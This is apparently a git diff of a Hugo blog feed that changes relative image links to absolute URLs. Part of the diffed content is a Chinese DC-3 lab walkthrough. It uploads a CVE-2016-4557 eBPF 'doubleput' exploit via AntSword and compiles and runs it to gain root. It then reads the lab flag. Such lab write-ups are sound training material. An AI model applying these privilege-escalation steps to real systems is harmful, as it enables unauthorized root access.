+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image076.png&#34;
 	width=&#34;536&#34;
 	height=&#34;267&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image076_hu_56bbfd5eac7ba2cf.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image076_hu_a65663e94eafbfac.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image076_hu_56bbfd5eac7ba2cf.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image076_hu_a65663e94eafbfac.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -847,10 +847,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 	
 &gt;
 图39发现漏洞1&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image078.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image078.png&#34;
 	width=&#34;536&#34;
 	height=&#34;354&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image078_hu_3016e4b2ef0aee8b.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image078_hu_108f6bd5fa72f3f3.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image078_hu_3016e4b2ef0aee8b.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image078_hu_108f6bd5fa72f3f3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -861,10 +861,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &gt; &lt;/p&gt;
 &lt;p&gt;图40发现漏洞2&lt;/p&gt;
 &lt;p&gt;(28)挑选cve-2016-4557漏洞进行提权&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image080.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image080.png&#34;
 	width=&#34;536&#34;
 	height=&#34;85&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image080_hu_258bea17299d6e65.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image080_hu_52b7e9176a84a7ae.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image080_hu_258bea17299d6e65.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image080_hu_52b7e9176a84a7ae.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -875,10 +875,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &gt; &lt;/p&gt;
 &lt;p&gt;图41 挑选漏洞进行提权&lt;/p&gt;
 &lt;p&gt;(29)输入图片中的url下载文件   然后利用蚁剑上传文件&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image082.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image082.png&#34;
 	width=&#34;487&#34;
 	height=&#34;294&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image082_hu_acb6a5fd8bb53ac7.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image082_hu_6653866de9d92a39.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image082_hu_acb6a5fd8bb53ac7.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image082_hu_6653866de9d92a39.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -890,10 +890,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;图42上传漏洞文件&lt;/p&gt;
 &lt;p&gt;(30)输入ls&lt;/p&gt;
 &lt;p&gt;unzip 39972.zip 解压文件&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image084.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image084.png&#34;
 	width=&#34;536&#34;
 	height=&#34;100&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image084_hu_401771a4f07cd767.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image084_hu_9c5d8b5c8694bf5f.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image084_hu_401771a4f07cd767.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image084_hu_9c5d8b5c8694bf5f.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -903,10 +903,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 	
 &gt;  &lt;/p&gt;
 &lt;p&gt;图43 解压文件&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image086.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image086.png&#34;
 	width=&#34;536&#34;
 	height=&#34;147&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image086_hu_4b599fff9558b600.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image086_hu_cbfba2677add7992.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image086_hu_4b599fff9558b600.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image086_hu_cbfba2677add7992.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -920,10 +920,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;ls&lt;/p&gt;
 &lt;p&gt;tar -xvf exploit.tar&lt;/p&gt;
 &lt;p&gt;cd ebpf_mapfd_doubleput_exploit&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image088.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image088.png&#34;
 	width=&#34;536&#34;
 	height=&#34;166&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image088_hu_696149bebcf2c07b.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image088_hu_da8d1817f7a28db4.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image088_hu_696149bebcf2c07b.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image088_hu_da8d1817f7a28db4.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -935,10 +935,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;图45 逐步提权&lt;/p&gt;
 &lt;p&gt;(32)输入ls点击回车  输入./compile.sh 点击回车  输入./doubleput.c点击回车&lt;/p&gt;
 &lt;p&gt;输入ls点击回车    在输入./doubleput点击回车
-&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image090.png&#34;
+&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image090.png&#34;
 	width=&#34;505&#34;
 	height=&#34;297&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image090_hu_c5ad916177f623f2.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image090_hu_aeb902ccc50fc4c7.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image090_hu_c5ad916177f623f2.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image090_hu_aeb902ccc50fc4c7.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -949,10 +949,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &gt;&lt;/p&gt;
 &lt;p&gt;图46 提权成功&lt;/p&gt;
 &lt;p&gt;(33)输入whoami 获得root权限&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image092.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image092.png&#34;
 	width=&#34;536&#34;
 	height=&#34;86&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image092_hu_dc1fc4d2401e9130.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image092_hu_ad51e82868d3b981.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image092_hu_dc1fc4d2401e9130.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image092_hu_ad51e82868d3b981.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -965,10 +965,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;(34)输入cd  /root回车&lt;/p&gt;
 &lt;p&gt;输入ls 回车&lt;/p&gt;
 &lt;p&gt;cat the-flag.txt回车&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image094.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image094.png&#34;
 	width=&#34;536&#34;
 	height=&#34;350&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image094_hu_545c5862afa7f0da.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image094_hu_d7d8f68635321ce0.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image094_hu_545c5862afa7f0da.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image094_hu_d7d8f68635321ce0.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -993,7 +993,7 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;git add .
 git commit -m &amp;ldquo;写了一篇新文章&amp;rdquo;
 git push
-&lt;img src=&#34;../img1.png&#34;
+&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/img1.png&#34;
 	
 	
 	
@@ -1012,10 +1012,10 @@ hugo server -D&lt;/p&gt;
         
         <guid>https://1noah11.github.io/lyeve.github.io/p/myfirstblog/</guid>
         <description>&lt;h3 id=&#34;hello-md-web-lyeve&#34;&gt;hello MD-WEB LYEVE
-&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/myfirstblog/image1.png&#34;
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/myfirstblog/image1.png&#34;
 	width=&#34;1263&#34;
 	height=&#34;839&#34;
-	srcset=&#34;../lyeve.github.io/p/myfirstblog/image1_hu_68c39592d3faa756.png 480w, ../lyeve.github.io/p/myfirstblog/image1_hu_e566ef8861db2fea.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/myfirstblog/image1_hu_68c39592d3faa756.png 480w, https://1noah11.github.io/lyeve.github.io/p/myfirstblog/image1_hu_e566ef8861db2fea.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -1045,10 +1045,10 @@ hugo server -D&lt;/p&gt;
     &gt;最暖的憂傷 - 田馥甄&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h2 id=&#34;图片&#34;&gt;图片
-&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/test-chinese/florian-klauer-nptLmg6jqDo-unsplash.jpg&#34;
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/test-chinese/florian-klauer-nptLmg6jqDo-unsplash.jpg&#34;
 	width=&#34;667&#34;
 	height=&#34;1000&#34;
-	srcset=&#34;../lyeve.github.io/p/test-chinese/florian-klauer-nptLmg6jqDo-unsplash_hu_7b8a06820e6d5c.jpg 480w, ../lyeve.github.io/p/test-chinese/florian-klauer-nptLmg6jqDo-unsplash_hu_a347f10e565b40ff.jpg 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/test-chinese/florian-klauer-nptLmg6jqDo-unsplash_hu_7b8a06820e6d5c.jpg 480w, https://1noah11.github.io/lyeve.github.io/p/test-chinese/florian-klauer-nptLmg6jqDo-unsplash_hu_a347f10e565b40ff.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Photo by Florian Klauer on Unsplash&#34;
@@ -1058,10 +1058,10 @@ hugo server -D&lt;/p&gt;
 		data-flex-grow=&#34;66&#34;
 		data-flex-basis=&#34;160px&#34;
 	
-&gt;  &lt;img src=&#34;../lyeve.github.io/p/test-chinese/luca-bravo-alS7ewQ41M8-unsplash.jpg&#34;
+&gt;  &lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/test-chinese/luca-bravo-alS7ewQ41M8-unsplash.jpg&#34;
 	width=&#34;1000&#34;
 	height=&#34;667&#34;
-	srcset=&#34;../lyeve.github.io/p/test-chinese/luca-bravo-alS7ewQ41M8-unsplash_hu_258fc4da0cfc7de9.jpg 480w, ../lyeve.github.io/p/test-chinese/luca-bravo-alS7ewQ41M8-unsplash_hu_d415bcea096fe061.jpg 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/test-chinese/luca-bravo-alS7ewQ41M8-unsplash_hu_258fc4da0cfc7de9.jpg 480w, https://1noah11.github.io/lyeve.github.io/p/test-chinese/luca-bravo-alS7ewQ41M8-unsplash_hu_d415bcea096fe061.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Photo by Luca Bravo on Unsplash&#34;
@@ -1072,10 +1072,10 @@ hugo server -D&lt;/p&gt;
 		data-flex-basis=&#34;359px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/test-chinese/helena-hertz-wWZzXlDpMog-unsplash.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/test-chinese/helena-hertz-wWZzXlDpMog-unsplash.jpg&#34;
 	width=&#34;1000&#34;
 	height=&#34;750&#34;
-	srcset=&#34;../lyeve.github.io/p/test-chinese/helena-hertz-wWZzXlDpMog-unsplash_hu_dfbb0c559c3df461.jpg 480w, ../lyeve.github.io/p/test-chinese/helena-hertz-wWZzXlDpMog-unsplash_hu_212d0718b8e99eaa.jpg 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/test-chinese/helena-hertz-wWZzXlDpMog-unsplash_hu_dfbb0c559c3df461.jpg 480w, https://1noah11.github.io/lyeve.github.io/p/test-chinese/helena-hertz-wWZzXlDpMog-unsplash_hu_212d0718b8e99eaa.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Photo by Helena Hertz on Unsplash&#34;
@@ -1085,10 +1085,10 @@ hugo server -D&lt;/p&gt;
 		data-flex-grow=&#34;133&#34;
 		data-flex-basis=&#34;320px&#34;
 	
-&gt;  &lt;img src=&#34;../lyeve.github.io/p/test-chinese/hudai-gayiran-3Od_VKcDEAA-unsplash.jpg&#34;
+&gt;  &lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/test-chinese/hudai-gayiran-3Od_VKcDEAA-unsplash.jpg&#34;
 	width=&#34;667&#34;
 	height=&#34;1000&#34;
-	srcset=&#34;../lyeve.github.io/p/test-chinese/hudai-gayiran-3Od_VKcDEAA-unsplash_hu_41819e288bf4a8c0.jpg 480w, ../lyeve.github.io/p/test-chinese/hudai-gayiran-3Od_VKcDEAA-unsplash_hu_1277885c87f69490.jpg 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/test-chinese/hudai-gayiran-3Od_VKcDEAA-unsplash_hu_41819e288bf4a8c0.jpg 480w, https://1noah11.github.io/lyeve.github.io/p/test-chinese/hudai-gayiran-3Od_VKcDEAA-unsplash_hu_1277885c87f69490.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Photo by Hudai Gayiran on Unsplash&#34;
